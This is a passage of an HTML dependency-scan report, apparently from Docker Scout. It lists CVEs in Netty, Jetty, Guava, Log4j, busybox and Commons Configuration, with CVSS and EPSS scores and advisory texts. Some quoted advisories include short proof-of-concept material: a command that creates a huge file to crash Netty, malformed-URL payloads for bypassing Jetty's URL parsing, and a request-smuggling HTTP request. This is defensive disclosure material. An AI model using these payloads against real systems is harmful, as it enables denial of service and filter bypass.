<tr><td>Fixed version</td><td><code>2.10.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.203%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>42nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

This Out-of-bounds Write vulnerability in Apache Commons Configuration affects Apache Commons Configuration: from 2.0 before 2.10.1. User can see this as a 'StackOverflowError' when adding a property in 'AbstractListDelimiterHandler.flattenIterator()'.
Users are recommended to upgrade to version 2.10.1, which fixes the issue.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>io.netty/netty-common</strong> <code>4.1.96.Final</code> (maven)</summary>

<small><code>pkg:maven/io.netty/netty-common@4.1.96.Final</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-25193?s=github&n=netty-common&ns=io.netty&t=maven&vr=%3C4.1.118.Final"><img alt="medium 5.5: CVE--2025--25193" src="https://img.shields.io/badge/CVE--2025--25193-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><4.1.118.Final</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.118.Final</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.063%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>20th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
An unsafe reading of environment file could potentially cause a denial of service in Netty.
When loaded on an Windows application, Netty attemps to load a file that does not exist. If an attacker creates such a large file, the Netty application crash.

### Details
A similar issue was previously reported in https://github.com/netty/netty/security/advisories/GHSA-xq3w-v528-46rv
This issue was fixed, but the fix was incomplete in that null-bytes were not counted against the input limit.


### PoC
The PoC is the same as for https://github.com/netty/netty/security/advisories/GHSA-xq3w-v528-46rv with the detail that the file should only contain null-bytes; 0x00.
When the null-bytes are encountered by the `InputStreamReader`, it will issue replacement characters in its charset decoding, which will fill up the line-buffer in the `BufferedReader.readLine()`, because the replacement character is not a line-break character.

### Impact
Impact is the same as https://github.com/netty/netty/security/advisories/GHSA-xq3w-v528-46rv

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-47535?s=github&n=netty-common&ns=io.netty&t=maven&vr=%3C%3D4.1.114.Final"><img alt="medium 5.4: CVE--2024--47535" src="https://img.shields.io/badge/CVE--2024--47535-lightgrey?label=medium%205.4&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code><=4.1.114.Final</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.115.Final</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.198%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>42nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

An unsafe reading of environment file could potentially cause a denial of service in Netty.
When loaded on an Windows application, Netty attemps to load a file that does not exist. If an attacker creates such a large file, the Netty application crash.


### Details

When the library netty is loaded in a java windows application, the library tries to identify the system environnement in which it is executed.

At this stage, Netty tries to load both `/etc/os-release` and `/usr/lib/os-release` even though it is in a Windows environment. 

<img width="364" alt="1" src="https://github.com/user-attachments/assets/9466b181-9394-45a3-b0e3-1dcf105def59">

If netty finds this files, it reads them and loads them into memory.

By default :

- The JVM maximum memory size is set to 1 GB,
- A non-privileged user can create a directory at `C:\` and create files within it.

<img width="340" alt="2" src="https://github.com/user-attachments/assets/43b359a2-5871-4592-ae2b-ffc40ac76831">

<img width="523" alt="3" src="https://github.com/user-attachments/assets/ad5c6eed-451c-4513-92d5-ba0eee7715c1">

the source code identified :
https://github.com/netty/netty/blob/4.1/common/src/main/java/io/netty/util/internal/PlatformDependent.java

Despite the implementation of the function `normalizeOs()` the source code not verify the OS before reading `C:\etc\os-release` and `C:\usr\lib\os-release`.

### PoC

Create a file larger than 1 GB of data in `C:\etc\os-release` or `C:\usr\lib\os-release` on a Windows environnement and start your Netty application.

To observe what the application does with the file, the security analyst used "Process Monitor" from the "Windows SysInternals" suite. (https://learn.microsoft.com/en-us/sysinternals/)

```
cd C:\etc
fsutil file createnew os-release 3000000000
```

<img width="519" alt="4" src="https://github.com/user-attachments/assets/39df22a3-462b-4fd0-af9a-aa30077ec08f">

<img width="517" alt="5" src="https://github.com/user-attachments/assets/129dbd50-fc36-4da5-8eb1-582123fb528f">

The source code used is the Netty website code example : [Echo ‐ the very basic client and server](https://netty.io/4.1/xref/io/netty/example/echo/package-summary.html).

The vulnerability was tested on the 4.1.112.Final version.

The security analyst tried the same technique for `C:\proc\sys\net\core\somaxconn` with a lot of values to impact Netty but the only things that works is the "larger than 1 GB file" technique. https://github.com/netty/netty/blob/c0fdb8e9f8f256990e902fcfffbbe10754d0f3dd/common/src/main/java/io/netty/util/NetUtil.java#L186

### Impact

By loading the "file larger than 1 GB" into the memory, the Netty library exceeds the JVM memory limit and causes a crash in the java Windows application.

This behaviour occurs 100% of the time in both Server mode and Client mode if the large file exists.

Client mode :

<img width="449" alt="6" src="https://github.com/user-attachments/assets/f8fe1ed0-1a42-4490-b9ed-dbc9af7804be">

Server mode :

<img width="464" alt="7" src="https://github.com/user-attachments/assets/b34b42bd-4fbd-4170-b93a-d29ba87b88eb">

somaxconn :

<img width="532" alt="8" src="https://github.com/user-attachments/assets/0656b3bb-32c6-4ae2-bff7-d93babba08a3">

### Severity

- Attack vector : "Local" because the attacker needs to be on the system where the Netty application is running.
- Attack complexity : "Low" because the attacker only need to create a massive file (regardless of its contents).
- Privileges required : "Low" because the attacker requires a user account to exploit the vulnerability.
- User intercation : "None" because the administrator don't need to accidentally click anywhere to trigger the vulnerability. Furthermore, the exploitation works with defaults windows/AD settings.
- Scope : "Unchanged" because only Netty is affected by the vulnerability.
- Confidentiality : "None" because no data is exposed through exploiting the vulnerability.
- Integrity : "None" because the explotation of the vulnerability does not allow editing, deleting or adding data elsewhere.
- Availability : "High" because the exploitation of this vulnerability crashes the entire java application.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.eclipse.jetty/jetty-http</strong> <code>9.4.51.v20230217</code> (maven)</summary>

<small><code>pkg:maven/org.eclipse.jetty/jetty-http@9.4.51.v20230217</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-6763?s=github&n=jetty-http&ns=org.eclipse.jetty&t=maven&vr=%3E%3D7.0.0%2C%3C%3D12.0.11"><img alt="medium 6.3: CVE--2024--6763" src="https://img.shields.io/badge/CVE--2024--6763-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Validation of Syntactic Correctness of Input</i>

<table>
<tr><td>Affected range</td><td><code>>=7.0.0<br/><=12.0.11</code></td></tr>
<tr><td>Fixed version</td><td><code>12.0.12</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>77th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

Eclipse Jetty is a lightweight, highly scalable, Java-based web server and Servlet engine . It includes a utility class, `HttpURI`, for URI/URL parsing.

The `HttpURI` class does insufficient validation on the authority segment of a URI.  However the behaviour of `HttpURI` differs from the common browsers in how it handles a URI that would be considered invalid if fully validated against the RRC.  Specifically `HttpURI` and the browser may differ on the value of the host extracted from an invalid URI and thus a combination of Jetty and a vulnerable browser may be vulnerable to a open redirect attack or to a SSRF attack if the URI is used after passing validation checks.

## Details

### Affected components

The vulnerable component is the `HttpURI` class when used as a utility class in an application.  The Jetty usage of the class is not vulnerable.

### Attack overview

The `HttpURI` class does not well validate the authority section of a URI. When presented with an illegal authority that may contain user info (eg username:password#@hostname:port), then the parsing of the URI is not failed.  Moreover, the interpretation of what part of the authority is the host name differs from a common browser in  that they also do not fail, but they select a different host name from the illegal URI.

### Attack scenario

A typical attack scenario is illustrated in the diagram below. The Validator checks whether the attacker-supplied URL is on the blocklist. If not, the URI is passed to the Requester for redirection. The Requester is responsible for sending requests to the hostname specified by the URI.

This attack occurs when the Validator is the `org.eclipse.jetty.http.HttpURI` class and the Requester is the `Browser` (include chrome, firefox and Safari). An attacker can send a malformed URI to the Validator (e.g., `http://browser.check%23%40vulndetector.com/` ). After validation, the Validator finds that the hostname is not on the blocklist. However, the Requester can still send requests to the domain with the hostname `vulndetector.com`.

## PoC

payloads:

```
http://browser.check &@vulndetector.com/
http://browser.check #@vulndetector.com/
http://browser.check?@vulndetector.com/
http://browser.check#@vulndetector.com/
http://vulndetector.com\\/
```

The problem of 302 redirect parsing in HTML tag scenarios. Below is a poc example. After clicking the button, the browser will open "browser.check", and jetty will parse this URL as "vulndetector.com".

```
<a href="http://browser.check#@vulndetector.com/"></a>
```
A comparison of the parsing differences between Jetty and chrome is shown in the table below (note that neither should accept the URI as valid).

| Invalid URI                                       | Jetty            | Chrome        |
| ---------------------------------------------- | ---------------- | ------------- |
| http://browser.check &@vulndetector.com/ | vulndetector.com | browser.check |
| http://browser.check #@vulndetector.com/ | vulndetector.com | browser.check |
| http://browser.check?@vulndetector.com/    | vulndetector.com | browser.check |
| http://browser.check#@vulndetector.com/    | vulndetector.com | browser.check |

The problem of 302 redirect parsing in HTTP 302 Location

| Input                    | Jetty          | Chrome        |
| ------------------------ | -------------- | ------------- |
| http://browser.check%5c/ | browser.check\ | browser.check |

It is noteworthy that Spring Web also faced similar security vulnerabilities, being affected by the aforementioned four types of payloads. These issues have since been resolved and have been assigned three CVE numbers [3-5].

## Impact

The impact of this vulnerability is limited to developers that use the Jetty HttpURI directly.  Example: your project implemented a blocklist to block on some hosts based on HttpURI's handling of authority section.  The vulnerability will help attackers bypass the protections that developers have set up for hosts. The vulnerability will lead to **SSRF**[1] and **URL Redirection**[2] vulnerabilities in several cases. 

## Mitigation

The attacks outlined above rely on decoded user data being passed to the `HttpURI` class. Application should not pass decoded user data as an encoded URI to any URI class/method, including `HttpURI`.  Such applications are likely to be vulnerable in other ways. 
The immediate solution is to upgrade to a version of the class that will fully validate the characters of the URI authority.  Ultimately, Jetty will deprecate and remove support for user info in the authority per [RFC9110 Section 4.2.4](https://datatracker.ietf.org/doc/html/rfc9110#section-4.2.4). 

Note that the Chrome (and other browsers) parse the invalid user info section improperly as well (due to flawed WhatWG URL parsing rules that do not apply outside of a Web Browser).

## Reference

[1] https://cwe.mitre.org/data/definitions/918.html
[2] https://cwe.mitre.org/data/definitions/601.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-40167?s=github&n=jetty-http&ns=org.eclipse.jetty&t=maven&vr=%3E%3D9.0.0%2C%3C%3D9.4.51"><img alt="medium 5.3: CVE--2023--40167" src="https://img.shields.io/badge/CVE--2023--40167-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Improper Handling of Length Parameter Inconsistency</i>

<table>
<tr><td>Affected range</td><td><code>>=9.0.0<br/><=9.4.51</code></td></tr>
<tr><td>Fixed version</td><td><code>9.4.52</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>5.222%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>90th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

Jetty accepts the '+' character proceeding the content-length value in a HTTP/1 header field.  This is more permissive than allowed by the RFC and other servers routinely reject such requests with 400 responses.  There is no known exploit scenario, but it is conceivable that request smuggling could result if jetty is used in combination with a server that does not close the connection after sending such a 400 response.

### Workarounds

There is no workaround as there is no known exploit scenario.   

### Original Report 

[RFC 9110 Secion 8.6](https://www.rfc-editor.org/rfc/rfc9110#section-8.6) defined the value of Content-Length header should be a string of 0-9 digits. However we found that Jetty accepts "+" prefixed Content-Length, which could lead to potential HTTP request smuggling.

Payload:

```
 POST / HTTP/1.1
 Host: a.com
 Content-Length: +16
 Connection: close
 ​
 0123456789abcdef
```

When sending this payload to Jetty, it can successfully parse and identify the length.

When sending this payload to NGINX, Apache HTTPd or other HTTP servers/parsers, they will return 400 bad request.

This behavior can lead to HTTP request smuggling and can be leveraged to bypass WAF or IDS.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>busybox</strong> <code>1.36.1-r29</code> (apk)</summary>

<small><code>pkg:apk/alpine/busybox@1.36.1-r29?os_name=alpine&os_version=3.20</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-60876?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C%3D1.36.1-r29"><img alt="medium : CVE--2025--60876" src="https://img.shields.io/badge/CVE--2025--60876-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.36.1-r29</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.050%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-46394?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C1.36.1-r31"><img alt="low : CVE--2025--46394" src="https://img.shields.io/badge/CVE--2025--46394-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.36.1-r31</code></td></tr>
<tr><td>Fixed version</td><td><code>1.36.1-r31</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.024%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-58251?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C1.36.1-r31"><img alt="low : CVE--2024--58251" src="https://img.shields.io/badge/CVE--2024--58251-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.36.1-r31</code></td></tr>
<tr><td>Fixed version</td><td><code>1.36.1-r31</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.021%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>com.google.guava/guava</strong> <code>27.0-jre</code> (maven)</summary>

<small><code>pkg:maven/com.google.guava/guava@27.0-jre</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-2976?s=github&n=guava&ns=com.google.guava&t=maven&vr=%3E%3D1.0%2C%3C32.0.0-android"><img alt="medium 5.5: CVE--2023--2976" src="https://img.shields.io/badge/CVE--2023--2976-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> <i>Creation of Temporary File in Directory with Insecure Permissions</i>

<table>
<tr><td>Affected range</td><td><code>>=1.0<br/><32.0.0-android</code></td></tr>
<tr><td>Fixed version</td><td><code>32.0.0-android</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.079%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Use of Java's default temporary directory for file creation in `FileBackedOutputStream` in Google Guava versions 1.0 to 31.1 on Unix systems and Android Ice Cream Sandwich allows other users and apps on the machine with access to the default Java temporary directory to be able to access the files created by the class.

Even though the security vulnerability is fixed in version 32.0.0, maintainers recommend using version 32.0.1 as version 32.0.0 breaks some functionality under Windows.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-8908?s=github&n=guava&ns=com.google.guava&t=maven&vr=%3C32.0.0-android"><img alt="low 3.3: CVE--2020--8908" src="https://img.shields.io/badge/CVE--2020--8908-lightgrey?label=low%203.3&labelColor=fce1a9"/></a> <i>Improper Handling of Alternate Encoding</i>

<table>
<tr><td>Affected range</td><td><code><32.0.0-android</code></td></tr>
<tr><td>Fixed version</td><td><code>32.0.0-android</code></td></tr>
<tr><td>CVSS Score</td><td><code>3.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.072%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A temp directory creation vulnerability exists in Guava prior to version 32.0.0 allowing an attacker with access to the machine to potentially access data in a temporary directory created by the Guava `com.google.common.io.Files.createTempDir()`. The permissions granted to the directory created default to the standard unix-like /tmp ones, leaving the files open. Maintainers recommend explicitly changing the permissions after the creation of the directory, or removing uses of the vulnerable method.


</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>com.google.guava/guava</strong> <code>30.1.1-jre</code> (maven)</summary>

<small><code>pkg:maven/com.google.guava/guava@30.1.1-jre</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-2976?s=github&n=guava&ns=com.google.guava&t=maven&vr=%3E%3D1.0%2C%3C32.0.0-android"><img alt="medium 5.5: CVE--2023--2976" src="https://img.shields.io/badge/CVE--2023--2976-lightgrey?label=medium%205.5&labelColor=fbb552"/></a> <i>Creation of Temporary File in Directory with Insecure Permissions</i>

<table>
<tr><td>Affected range</td><td><code>>=1.0<br/><32.0.0-android</code></td></tr>
<tr><td>Fixed version</td><td><code>32.0.0-android</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.079%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Use of Java's default temporary directory for file creation in `FileBackedOutputStream` in Google Guava versions 1.0 to 31.1 on Unix systems and Android Ice Cream Sandwich allows other users and apps on the machine with access to the default Java temporary directory to be able to access the files created by the class.

Even though the security vulnerability is fixed in version 32.0.0, maintainers recommend using version 32.0.1 as version 32.0.0 breaks some functionality under Windows.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-8908?s=github&n=guava&ns=com.google.guava&t=maven&vr=%3C32.0.0-android"><img alt="low 3.3: CVE--2020--8908" src="https://img.shields.io/badge/CVE--2020--8908-lightgrey?label=low%203.3&labelColor=fce1a9"/></a> <i>Improper Handling of Alternate Encoding</i>

<table>
<tr><td>Affected range</td><td><code><32.0.0-android</code></td></tr>
<tr><td>Fixed version</td><td><code>32.0.0-android</code></td></tr>
<tr><td>CVSS Score</td><td><code>3.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.072%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A temp directory creation vulnerability exists in Guava prior to version 32.0.0 allowing an attacker with access to the machine to potentially access data in a temporary directory created by the Guava `com.google.common.io.Files.createTempDir()`. The permissions granted to the directory created default to the standard unix-like /tmp ones, leaving the files open. Maintainers recommend explicitly changing the permissions after the creation of the directory, or removing uses of the vulnerable method.


</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.apache.logging.log4j/log4j-core</strong> <code>2.22.1</code> (maven)</summary>

<small><code>pkg:maven/org.apache.logging.log4j/log4j-core@2.22.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-68161?s=github&n=log4j-core&ns=org.apache.logging.log4j&t=maven&vr=%3E%3D2.0-beta9%2C%3C2.25.3"><img alt="medium 6.3: CVE--2025--68161" src="https://img.shields.io/badge/CVE--2025--68161-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Validation of Certificate with Host Mismatch</i>

<table>
<tr><td>Affected range</td><td><code>>=2.0-beta9<br/><2.25.3</code></td></tr>
<tr><td>Fixed version</td><td><code>2.25.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:L/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.037%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Socket Appender in Apache Log4j Core versions 2.0-beta9 through 2.25.2 does not perform TLS hostname verification of the peer certificate, even when the  [verifyHostName](https://logging.apache.org/log4j/2.x/manual/appenders/network.html#SslConfiguration-attr-verifyHostName)  configuration attribute or the  [log4j2.sslVerifyHostName](https://logging.apache.org/log4j/2.x/manual/systemproperties.html#log4j2.sslVerifyHostName) system property is set to true.

This issue may allow a man-in-the-middle attacker to intercept or redirect log traffic under the following conditions:

  *  The attacker is able to intercept or redirect network traffic between the client and the log receiver.
  *  The attacker can present a server certificate issued by a certification authority trusted by the Socket Appender’s configured trust store (or by the default Java trust store if no custom trust store is configured).


Users are advised to upgrade to Apache Log4j Core version 2.25.3, which addresses this issue.

As an alternative mitigation, the Socket Appender may be configured to use a private or restricted trust root to limit the set of trusted certificates.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.eclipse.jetty/jetty-http</strong> <code>9.4.52.v20230823</code> (maven)</summary>

<small><code>pkg:maven/org.eclipse.jetty/jetty-http@9.4.52.v20230823</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-6763?s=github&n=jetty-http&ns=org.eclipse.jetty&t=maven&vr=%3E%3D7.0.0%2C%3C%3D12.0.11"><img alt="medium 6.3: CVE--2024--6763" src="https://img.shields.io/badge/CVE--2024--6763-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Validation of Syntactic Correctness of Input</i>

<table>
<tr><td>Affected range</td><td><code>>=7.0.0<br/><=12.0.11</code></td></tr>
<tr><td>Fixed version</td><td><code>12.0.12</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>77th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

Eclipse Jetty is a lightweight, highly scalable, Java-based web server and Servlet engine . It includes a utility class, `HttpURI`, for URI/URL parsing.

The `HttpURI` class does insufficient validation on the authority segment of a URI.  However the behaviour of `HttpURI` differs from the common browsers in how it handles a URI that would be considered invalid if fully validated against the RRC.  Specifically `HttpURI` and the browser may differ on the value of the host extracted from an invalid URI and thus a combination of Jetty and a vulnerable browser may be vulnerable to a open redirect attack or to a SSRF attack if the URI is used after passing validation checks.

## Details

### Affected components

The vulnerable component is the `HttpURI` class when used as a utility class in an application.  The Jetty usage of the class is not vulnerable.

### Attack overview

The `HttpURI` class does not well validate the authority section of a URI. When presented with an illegal authority that may contain user info (eg username:password#@hostname:port), then the parsing of the URI is not failed.  Moreover, the interpretation of what part of the authority is the host name differs from a common browser in  that they also do not fail, but they select a different host name from the illegal URI.

### Attack scenario

A typical attack scenario is illustrated in the diagram below. The Validator checks whether the attacker-supplied URL is on the blocklist. If not, the URI is passed to the Requester for redirection. The Requester is responsible for sending requests to the hostname specified by the URI.

This attack occurs when the Validator is the `org.eclipse.jetty.http.HttpURI` class and the Requester is the `Browser` (include chrome, firefox and Safari). An attacker can send a malformed URI to the Validator (e.g., `http://browser.check%23%40vulndetector.com/` ). After validation, the Validator finds that the hostname is not on the blocklist. However, the Requester can still send requests to the domain with the hostname `vulndetector.com`.

## PoC

payloads:

```
http://browser.check &@vulndetector.com/
http://browser.check #@vulndetector.com/
http://browser.check?@vulndetector.com/
http://browser.check#@vulndetector.com/
http://vulndetector.com\\/
```

The problem of 302 redirect parsing in HTML tag scenarios. Below is a poc example. After clicking the button, the browser will open "browser.check", and jetty will parse this URL as "vulndetector.com".

```
<a href="http://browser.check#@vulndetector.com/"></a>
```
A comparison of the parsing differences between Jetty and chrome is shown in the table below (note that neither should accept the URI as valid).

| Invalid URI                                       | Jetty            | Chrome        |
| ---------------------------------------------- | ---------------- | ------------- |
| http://browser.check &@vulndetector.com/ | vulndetector.com | browser.check |
| http://browser.check #@vulndetector.com/ | vulndetector.com | browser.check |
| http://browser.check?@vulndetector.com/    | vulndetector.com | browser.check |
| http://browser.check#@vulndetector.com/    | vulndetector.com | browser.check |

The problem of 302 redirect parsing in HTTP 302 Location

| Input                    | Jetty          | Chrome        |
| ------------------------ | -------------- | ------------- |
| http://browser.check%5c/ | browser.check\ | browser.check |

It is noteworthy that Spring Web also faced similar security vulnerabilities, being affected by the aforementioned four types of payloads. These issues have since been resolved and have been assigned three CVE numbers [3-5].

## Impact

The impact of this vulnerability is limited to developers that use the Jetty HttpURI directly.  Example: your project implemented a blocklist to block on some hosts based on HttpURI's handling of authority section.  The vulnerability will help attackers bypass the protections that developers have set up for hosts. The vulnerability will lead to **SSRF**[1] and **URL Redirection**[2] vulnerabilities in several cases. 

## Mitigation

The attacks outlined above rely on decoded user data being passed to the `HttpURI` class. Application should not pass decoded user data as an encoded URI to any URI class/method, including `HttpURI`.  Such applications are likely to be vulnerable in other ways. 
The immediate solution is to upgrade to a version of the class that will fully validate the characters of the URI authority.  Ultimately, Jetty will deprecate and remove support for user info in the authority per [RFC9110 Section 4.2.4](https://datatracker.ietf.org/doc/html/rfc9110#section-4.2.4). 

Note that the Chrome (and other browsers) parse the invalid user info section improperly as well (due to flawed WhatWG URL parsing rules that do not apply outside of a Web Browser).

## Reference

[1] https://cwe.mitre.org/data/definitions/918.html
[2] https://cwe.mitre.org/data/definitions/601.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
